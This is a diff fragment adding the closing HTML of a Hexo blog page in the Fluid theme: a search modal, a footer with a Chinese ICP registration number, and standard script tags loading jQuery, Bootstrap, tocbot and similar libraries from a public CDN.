+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
